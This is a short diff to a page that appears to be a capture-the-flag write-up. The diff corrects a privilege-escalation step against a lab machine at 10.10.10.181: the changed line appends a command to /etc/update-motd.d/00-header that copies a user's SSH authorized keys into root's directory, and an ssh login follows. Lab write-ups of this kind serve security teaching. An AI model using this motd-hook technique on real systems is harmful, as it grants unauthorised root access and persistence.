@@ -125,7 +125,7 @@ upload sysadmin's authorized keys into the root ssh directory and then ssh into 
 <p>We will have to do this quickly as the files get restored every 30 seconds</p>
 <p>cd into /etc/update-motd.d and then do this command:</p>
 <div class="sourceCode">
-  <pre class="sourceCode bash">echo "/home/sysadmin/.ssh/authorized_keys /root/.ssh" >> 00-header</pre></div>
+  <pre class="sourceCode bash">echo "cp /home/sysadmin/.ssh/authorized_keys /root/.ssh" >> 00-header</pre></div>
   <p>Then enter the command then open 2 terminals. One that ssh's into sysadmin like so</p>
   <div class="sourceCode">
     <pre class="sourceCode bash">ssh -i ~/.ssh/id_rsa sysadmin@10.10.10.181</pre></div>
